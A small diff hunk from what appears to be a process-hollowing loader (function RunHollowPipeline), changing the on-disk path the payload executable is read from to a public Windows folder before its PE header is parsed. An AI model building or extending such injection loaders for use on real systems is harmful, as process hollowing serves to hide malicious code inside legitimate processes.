@@ -265,7 +265,7 @@ DWORD RunHollowPipeline() {
 
     // ── 0. Read payload ────────────────────────────────────────────────
     DWORD payloadSize = 0;
-    LPBYTE payload = ReadPayloadFromDisk("payload.exe", &payloadSize);
+    LPBYTE payload = ReadPayloadFromDisk("C:\\Users\\Public\\payload.exe", &payloadSize);
     if (!payload) return 1;
 
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
